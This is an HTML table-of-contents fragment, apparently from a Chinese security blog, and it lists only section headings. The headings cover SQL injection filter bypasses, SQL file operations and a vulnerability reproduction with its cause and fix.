<span class="toc-text">空格waf</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#引号"><span class="toc-number">5.3.</span> <span class="toc-text">引号</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#逗号"><span class="toc-number">5.4.</span> <span class="toc-text">逗号</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#or"><span class="toc-number">5.5.</span> <span class="toc-text">or</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#and"><span class="toc-number">5.6.</span> <span class="toc-text">and</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#等号过滤"><span class="toc-number">5.7.</span> <span class="toc-text">等号过滤</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SQL文件操作"><span class="toc-number">6.</span> <span class="toc-text">SQL文件操作</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#load-file"><span class="toc-number">6.1.</span> <span class="toc-text">load_file()</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#into-outfile"><span class="toc-number">6.2.</span> <span class="toc-text">into outfile</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#load-data"><span class="toc-number">6.3.</span> <span class="toc-text">load data</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Tricks"><span class="toc-number">7.</span> <span class="toc-text">Tricks</span></a></li></ol>
+                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#复现过程"><span class="toc-number">1.</span> <span class="toc-text">复现过程</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#攻击机"><span class="toc-number">1.1.</span> <span class="toc-text">攻击机</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#客户机"><span class="toc-number">1.2.</span> <span class="toc-text">客户机</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#攻击成功"><span class="toc-number">1.3.</span> <span class="toc-text">攻击成功</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#漏洞成因及修补方式"><span class="toc-number">2.</span> <span class="toc-text">漏洞成因及修补方式</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#成因"><span class="toc-number">2.1.</span> <span class="toc-text">成因</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#修补方式"><span class="toc-number">2.2.</span> <span class="toc-text">修补方式</span></a></li></ol></li></ol>
                     </div>
                 </span>
             </div>
